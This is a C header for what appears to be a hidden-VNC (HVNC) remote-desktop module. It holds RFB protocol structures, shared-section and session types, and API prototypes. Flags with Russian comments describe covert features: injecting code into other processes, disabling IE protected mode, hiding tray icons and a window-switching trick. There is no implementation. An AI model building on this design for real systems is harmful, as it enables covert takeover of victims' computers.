//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: vnc.h
// $Revision: 202 $
// $Date: 2014-07-14 20:21:11 +0400 (Пн, 14 июл 2014) $
// description:
//	VNC API.

#ifndef __VNC_H_
#define __VNC_H_

typedef struct _RFB_SESSION *PRFB_SESSION;

// Current process ID used for debg output
extern	DWORD	g_CurrentProcessId;


//	For most ordinary keys, "keysum" is the same as the corresponding ASCII value.
//	Other common key values are defined here:
#define	VncKeyBackSpace		0xff08
#define	VncKeyTab			0xff09
#define	VncKeyReturn		0xff0d
#define	VncKeyEscape		0xff1b
#define	VncKeyInsert		0xff63
#define	VnckeyDelete		0xffff
#define	VncKeyHome			0xff50
#define	VncKeyEnd			0xff57
#define	VncKeyPageUp		0xff55
#define	VncKeyPageDown		0xff56
#define	VncKeyLeft			0xff51
#define	VncKeyUp			0xff52
#define	VncKeyRight			0xff53
#define	VncKeyDown			0xff54
#define	VncKeyF1			0xffbe
#define	VncKeyF2			0xffbf
#define	VncKeyF12			0xffc9
#define	VncKeyShift			0xffe1
#define	VncKeyControl		0xffe3
#define	VncKeyMeta			0xffe7
#define	VncKeyAlt			0xffe9


#pragma pack(push)
#pragma pack(1)

typedef struct _PIXEL_FORMAT
{
	//	BitsPerPixel is the number of bits used for each pixel value on the wire. This must
	//	be greater than or equal to the Depth.
	//	Currently BitsPerPixel must be 8, 16 or 32, less than 8-bit pixels are not yet supported. 
	UCHAR	BitsPerPixel;

	//	Depth is the number of useful bits in the pixel value.
	UCHAR	Depth;

	//	BigEndianFlag is non-zero (true) if multi-byte pixels are interpreted as big endian. 
	UCHAR	BigEndianFlag;

	//	If TrueColourFlag is non-zero (true) then the last six items specify how to extract the
	//	red, green and blue intensities fromthe pixel value.
	UCHAR	TrueColourFlag;

	//	RedMax is the maximum red value (= 2^N - 1, where N is the number of bits used for red).
	USHORT	RedMax;

	//	Is similar as RedMax but for the green.
	USHORT	GreenMax;

	//	Is similar as RedMax but for the blue.
	USHORT	BlueMax;

	//	RedShift is the number of shifts needed to get the red value in a pixel to the least significant bit.
	UCHAR	RedShift;

	//	Is similar as RedShift but for the green.
	UCHAR	GreenShift;

	//	Is similar as RedShift but for the blue.
	UCHAR	BlueShift;

	//	For example, to find the red value (between 0 and RedMax) from a given pixel, do the following:
	//	- Swap the pixel value according to BigEndianFlag (e.g. if BigEndianFlag is zero (false) and 
	//		host byte order is big endian, then swap).
	//	- Shift right by RedShift.
	//	- AND with RedMax (in host byte order).

	//	Padding is for alingment.
	UCHAR	Padding[3];
} PIXEL_FORMAT, *PPIXEL_FORMAT;


//	A key press or release event
typedef	struct	_VNC_KEY_EVENT
{
	//	For most ordinary keys this is the same as the corresponding ASCII value.
	//	Other common key values are defined earlier.
	ULONG	Key;

	//	Down-flag is TRUE if the key is now pressed, False if it is now released.
	BOOL	DownFlag;
} VNC_KEY_EVENT, *PVNC_KEY_EVENT;


//	Indicates either pointer movement or a pointer button press or release. The pointer is
//	now at (XPosition, YPosition), and the current state of buttons 1 to 8 are represented
//	by bits 0 to 7 of ButtonMask respectively, 0 meaning up, 1 meaning down (pressed).
typedef struct	_VNC_POINTER_EVENT
{
	ULONG			ButtonMask;
	USHORT			XPosition;
	USHORT			YPosition;
} VNC_POINTER_EVENT, *PVNC_POINTER_EVENT;

//	The client has new ASCII text in its cut buffer. End of lines are represented by the
//	linefeed / newline character (ASCII value 10) alone. No carriage-return (ASCII value 13) is needed.
#pragma warning( push )
#pragma warning( disable : 4200 )

typedef	struct	_VNC_CLIENT_CUT_TEXT
{
	ULONG			Length;
	CHAR			Text[0];
} VNC_CLIENT_CUT_TEXT, *PVNC_CLIENT_CUT_TEXT;
#pragma warning( pop )

// Describes the framebuffer containg a bitmap
typedef	struct _VNC_FRAMEBUFFER VNC_FRAMEBUFFER, *PVNC_FRAMEBUFFER;
typedef	struct _VNC_FRAMEBUFFER
{
	// Next framebuffer in chain or NULL if this is the last one.
	PVNC_FRAMEBUFFER	Next;

	// Buffer containing a bitmap and encoding header
	PVOID				Buffer;

	// Client rectangle for the bitmap
	//RECT				Rect;
	
	// Size of the buffer
	ULONG				Size;

	// rectangle encoding
	//ULONG				Encoding;

} VNC_FRAMEBUFFER, *PVNC_FRAMEBUFFER;


//	Notifies that the client is interested in the area of the framebuffer specified by Rect.
//	VNC assumes that the client keeps a copy of all parts of the framebuffer in which
//	it is interested. This means that normally it needs to send incremental updates to the client by 
//   returning one or more chaged fragments over VncBuffers field.
//	However, if for some reason the client has lost the contents of a particular area which it
//	needs, then the client sets Incremental field to FALSE. In this case VNC specifies only one buffer
//	 containing whole requested area.
typedef struct _VNC_FRAMEBUFFER_REQUEST
{
	// List of the framebuffers contating updated areas
	PVNC_FRAMEBUFFER	VncBuffers;

	// Client rectangle to update
	RECT				Rect;

	// Set to TRUE by the client if the client keeps a copy of all parts of the framebuffer in which it is interested.
	BOOL				Incremental;
} VNC_FRAMEBUFFER_REQUEST, *PVNC_FRAMEBUFFER_REQUEST;

#pragma pack(pop)

#define VMW_EXECUTE_MENU        1
#define VMW_HILITE_MENU         2
#define VMW_UPDATE_KEYSTATE     3
#define VMW_PRINT_SCREEN        4
#define VMW_DISPCHANGES         5
#define VMW_CHANGELAYOUT        6
#define VMW_IQTEST              7
#define VMW_ERASEBKG            8
#define VMW_TBHITTEST           9
#define VMW_TBLCLICK            10
#define VMW_TBRCLICK            11
#define VMW_SHOWSYSMENU         12
#define VMW_SETSTOLENWINDOW     13
#define VMW_ISTRANSMSGUSED      14

typedef struct _VNC_LAYOUT_SWITCHER
{
	HKL   hLayout;
	WCHAR szLoc[3];

	BOOL   bSwitcherStarted;
	HANDLE hThread;
	DWORD  ThreadID;

	HWND   hLayTrayWnd;
	HFONT  hFont;

	HWND   hTrayWnd;
	HWND   hReBarWindow;
	HWND   hTrayNotifyWnd;
	int    nMode;

}VNC_LAYOUT_SWITCHER,*PVNC_LAYOUT_SWITCHER;

typedef struct _Z_ORDER_LIST_ITEM *PZ_ORDER_LIST_ITEM;
typedef struct _Z_ORDER_LIST_ITEM
{
	HWND hWnd;
	PZ_ORDER_LIST_ITEM lpOwner;

	DWORD Style;
	BOOL  bAltTabItem;
	BOOL  bHidden;
	RECT  rect;
	BOOL  bTopMost;
	BOOL  bOverlapped;

	PZ_ORDER_LIST_ITEM lpNext;
	PZ_ORDER_LIST_ITEM lpPrev;
}Z_ORDER_LIST_ITEM;

typedef struct _VNC_WND_WATCHER
{
	CRITICAL_SECTION csWndsList;
	PZ_ORDER_LIST_ITEM lpZOrderList;
	BOOL bMessageBoxIsShown;

	BOOL bWatcherStarted;
	HWINEVENTHOOK hHook1;
	HWINEVENTHOOK hHook2;
	HWINEVENTHOOK hHook3;

	DWORD ThreadID;
	HANDLE hThread;
	HANDLE hStartEvent;
}VNC_WND_WATCHER,*PVNC_WND_WATCHER;

typedef struct _BITMAP_INFO {
	int TrueColourFlag;
	BITMAPINFOHEADER bmiHeader;
	union {
		struct {
			DWORD red;
			DWORD green;
			DWORD blue;
		} mask;
		RGBQUAD color[256];
	};
}BITMAP_INFO,*PBITMAP_INFO;

typedef	struct	_VNC_DESKTOP
{
	//	Current session desktop
	HDESK			hDesktop;

	// management thread parameters
	DWORD			MgmntThreadID;
	HDESK			MgmntDesktop; // original session mgmnt thread's desktop

	//	Current session shell process information
	PROCESS_INFORMATION	ShellInfo;

	//
	DWORD dwFlags;

	// desktop windows
	HWND hProgmanWnd;
	HWND hStartBtnWnd;
	HWND hStartMenuWnd;
	HWND hDeskWnd;
	HWND hShellWnd;
	HWND hTrayWnd;
	HWND hTakSwWnd;
	HWND hTakSwRebarWnd;
	HWND hToolBarWnd;
	HWND hMSTaskListWnd;
	HWND hDeskListView;
	HWND hDefView;
	HWND hTrayNotifyWnd;
	HWND hSysPagerWnd;
	HWND hOverflowIconWindow;
	HWND hTrayUserNotifyToolbarWnd;
	HWND hTrayUserNotifyOverflowToolbarWnd;
	HWND hTraySystemNotifyToolbarWnd;

	// layout switch window
	VNC_LAYOUT_SWITCHER LayoutSwitcher;

	// windows watcher
	VNC_WND_WATCHER WndWatcher;

	//clipboard
	HWND WndClipNotifier;
	HWND WndClipNextNotifier;

	// start btn for win8
	struct
	{
		BOOL   bStarted;
		BOOL   bShutdown;
		DWORD  ThreadID;
		HANDLE hThread;
	}StartMenu;
	
	// mouse
	ULONG  LastButtonMask;
	USHORT LastXPosition;
	USHORT LastYPosition;

	HWND hLastDownWindow;
	HWND hLastTopLevelWindow;
	DWORD dwLastDownMessage;
	DWORD dwLastDownTime;
	POINT ptLastDownPoints;
	BOOL bMoving;
	RECT rcMovingWnd;

	// keyboard
	BOOL bTabPressed;
	BOOL bSkipEvent;
	BOOL bShiftPressed;
	BOOL bVKDown;
	BOOL bKeyDown;
	DWORD dwLastShiftInputTime;

	// input thread
	DWORD idInputThread; // current input thread that we are attached to
	DWORD idInputPorcess;

	// screen format
	DWORD dwWidth;
	DWORD dwHeight;
	WORD  bBitsPerPixel; //BPP
	WORD  bBytesPerPixel;
	DWORD dwScreenBufferSize;
	DWORD dwWidthInBytes;

	// screen
	BITMAP_INFO BmInfo;
	PUCHAR FrameBuffer;
	HBITMAP hBitmap;
	HBITMAP hOldBitmap;
	HBITMAP hTmpBitmap;
	HBITMAP hTmpOldBitmap;
	LPDWORD lpChecksums;

	HBITMAP hIntermedOldBitmap;
	HDC hIntermedMemDC;
	HDC hDC;
	HDC hCompDC;
	HDC hTmpCompDC;
	HBITMAP hIntermedMemBitmap;
	LPVOID lpIntermedDIB;

	HDC hTmpIntermedMemDC;
	HBITMAP hTmpIntermedMemBitmap;
	HBITMAP hTmpIntermedOldBitmap;

	// screen thread
	HANDLE hScreenThread;
	HANDLE hScreenUpdateEvent;
	HANDLE hPaintingMutex;

	//	The name associated with the desktop.
	ULONG			NameLength;
	CHAR			Name[1];

}VNC_DESKTOP,*PVNC_DESKTOP;


#define	DESKTOP_NAME_LENGTH	256	// size of a NULL-terminated GUID sting
#define	GUID_NAME_LENGTH	40	// length of the GUID string in chars

#define GLOBAL_FLAG_INIT 1

// VNC shared section data structure
typedef	struct	_VNC_SHARED_DATA
{
	DWORD Flags;
	// cursor
	POINT ptCursor;

	// kbd key state
	UCHAR KbdState[0xFF];

	// active windows
	union
	{
		HWND hForegroundWnd;
		DWORD64 tmp0;
	};

	union
	{
		HWND hCapturedWnd;
		DWORD64 tmp1;
	};

	DWORD dwCapturedThreadID;
	WORD wCapturedArea;

	union
	{
		HWND hPrevCapturedWnd;
		DWORD64 tmp2;
	};

	// current shell window
	union
	{
		HWND hShellWnd;
		DWORD64 tmp3;
	};

	// per session taskman window (taskbar)
	union
	{
		HWND hTaskmanWnd;
		DWORD64 tmp4;
	};

	// per session progman window
	union
	{
		HWND hProgmanWnd;
		DWORD64 tmp5;
	};

	DWORD dwPrevCapturedThreadID;
	WORD wPrevCapturedArea;

	// servicing message for wnd hooks
	DWORD dwVNCMessage;

	// shared desktop flags
	DWORD dwDeskFlags;

	// screen
	int dwWidth;
	int dwHeight;

	//shared pixel format
	WORD  bBitsPerPixel; //BPP

	BOOL bAutodectLayout;
	BOOL bTrayIconUnderCursor;

	// global shell pid
	DWORD dwExplorersPID;

	_TCHAR	NamespaceName[GUID_NAME_LENGTH];
	_TCHAR	DesktopName[DESKTOP_NAME_LENGTH];
} VNC_SHARED_DATA, *PVNC_SHARED_DATA;

// VNC shared section descriptor
typedef	struct	_VNC_SHARED_SECTION
{
	HANDLE				hLockMutex;		// Shared data section lock mutex
	HANDLE				hStatusEvent;	// Session status event
	HANDLE				hUpdateEvent;	// Session update event
	HANDLE				hMap; // section object
	PVNC_SHARED_DATA	Data;			// Shared data section

	HANDLE				hFrameBufferMutex;		// Shared frame buffer lock mutex
	// shared frame buffer
	LPTSTR				szFrameBufferName;
	HANDLE				hFrameBuffer;
	PVOID				pFrameBuffer;
	ULONG				FrameBufferSize;

	
#if _DEBUG
	ULONG				Magic;
	LONG volatile		LockCount;
#endif
} VNC_SHARED_SECTION, *PVNC_SHARED_SECTION;

#define	SHARED_SECTION_MAGIC		'ceSS'
#define	ASSERT_SHARED_SECTION(x)	ASSERT(x->Magic == SHARED_SECTION_MAGIC)

#pragma warning( push )
#pragma warning( disable : 4200 )

typedef	struct	_VNC_SESSION
{
#if _DEBUG
	ULONG			Magic;
#endif
	struct	_VNC_SESSION *Next;

	// backm link to original rfb session
	PRFB_SESSION RfbSession;

	// section lock
	HANDLE				hLockMutex;

	VNC_SHARED_SECTION	SharedSection;	// VNC shared data section descriptor

	// frame buffers
	PVNC_FRAMEBUFFER FrameBuffer;

	// update request
	// Client rectangle to update
	RECT				Rect;
	// Set to TRUE by the client if the client keeps a copy of all parts of the framebuffer in which it is interested.
	BOOL				Incremental;

	// current session desktop
	VNC_DESKTOP			Desktop;

	//
	// !!! DO NOT PUT ANY NEW FIELDS AFTER Desktop !!!
	// 

} VNC_SESSION, *PVNC_SESSION;
#pragma warning( pop )

#define	VNC_SESSION_MAGIC	'SncV'
#define	ASSERT_VNC_SESSION(x)	ASSERT(x->Magic == VNC_SESSION_MAGIC);

#define HVNC_NO_SHELL                       0x001 ///не запускать explorer
#define HVNC_NO_INJECTS                     0x002 ///не инжектировать код в чужие процессы
#define HVNC_SCREEN_SIZE_DETERMINED         0x004 ///размер экрана задан
#define HVNC_NO_VNC_CURSOR                  0x008 ///не передавать координаты курсора VNC-клиенту
#define HVNC_USE_BITBLT                     0x010 ///использовать BitBlt вместо PrintWindow (для input-десктопа)
#define HVNC_NO_CPU_LIMITS                  0x020 ///не ограничивать количество процессорного времени
#define HVNC_DRAW_USER_CURSOR               0x040 ///рисовать пользовательский курсор (не VNC!)
#define HVNC_DONT_HIDE_JAVA_ICON            0x080 ///не скрывать значек жабы из трея
#define HVNC_DONT_DISABLE_IE_SAFEMODE       0x100 ///не отключать защищенный режим IE
#define HVNC_DONT_DISABLE_EFFECTS           0x200 ///не отключать эффекты
#define HVNC_NO_WINDOWS_MANIPULATION_TRICK  0x400 ///обычное переключение окон (без трюка с MessageBox)
#define HVNC_DONT_DISABLE_THEMES            0x800 ///не отключать темы
#define HVNC_NO_WNDHOOK                     0x1000
#define HVNC_NO_CTBHOOK                     0x2000
#define HVNC_NO_SUBCLASS                    0x4000

#define HVNC_MSG_TITLE "#hvnc"

WINERROR	VncStartup(VOID);
VOID		VncCleanup(VOID);

WINERROR	VncCreateSession(IN PRFB_SESSION RfbSession,PVNC_SESSION* pVncSession,OUT PPIXEL_FORMAT LocalPixelFormat );
VOID		VncCloseSession(PVNC_SESSION pSession);

WINERROR	VncSetPixelFormat(PVNC_SESSION pVncSession, PPIXEL_FORMAT pPixelFormat);
WINERROR	VncGetFramebuffer(PVNC_SESSION pVncSession, PVNC_FRAMEBUFFER_REQUEST pRequest);

WINERROR	VncOnKeyEvent(PVNC_SESSION pVncSession, PVNC_KEY_EVENT pKeyEvent);
WINERROR	VncOnPointerEvent(PVNC_SESSION pVncSession, PVNC_POINTER_EVENT pPointerEvent);
WINERROR	VncOnClientCutText(PVNC_SESSION pVncSession, PVNC_CLIENT_CUT_TEXT pClientCutText);

VOID		VncReleaseFramebuffer(PVNC_FRAMEBUFFER fBuffer);


// Shared section management
WINERROR	VncInitSharedSection(HDESK hDesktop, PVNC_SHARED_SECTION pSection, IN ULONG SharedMemSize, BOOL bCreateNew);
VOID		VncReleaseSharedSection(PVNC_SHARED_SECTION	pSection);
BOOL		VncLockSharedSection(PVNC_SHARED_SECTION pSection);
VOID		VncUnlockSharedSection(PVNC_SHARED_SECTION pSection);
WINERROR	VncRemapFrameBuffer(IN PVNC_SHARED_SECTION pSection, IN ULONG SharedMemSize, IN BOOL bCreateNew );
VOID VncNotifySectionUpdate(PVNC_SHARED_SECTION pSection);

BOOL VncLockFrameBuffer(PVNC_SHARED_SECTION pSection);
VOID VncUnlockFrameBuffer(PVNC_SHARED_SECTION pSection);

typedef BOOL (*PVNC_COMPARE_FUNC)(PVNC_SESSION pVncSession, PVOID Context );
VOID VncAcquireListLock( VOID );
VOID VncReleaseListLock( VOID );
PVNC_SESSION VncSessionLookup( PVNC_COMPARE_FUNC func, PVOID Context );

VOID VncLockSession( PVNC_SESSION pSession );
VOID VncUnlockSession( PVNC_SESSION pSession );

#define SS_LOCK(pVNC)   VncLockSharedSection(&(pVNC)->SharedSection)
#define SS_UNLOCK(pVNC) VncUnlockSharedSection(&(pVNC)->SharedSection)
#define SS_GET_DATA(pVNC) (pVNC)->SharedSection.Data

HWND SS_GET_FOREGROUND_WND ( PVNC_SESSION pSession );
VOID SS_SET_FOREGROUND_WND ( PVNC_SESSION pSession, HWND hWnd );

WINERROR InitNamespace(LPTSTR NamespacePrefix);
VOID CleanupNamespace(VOID);

#endif //__VNC_H_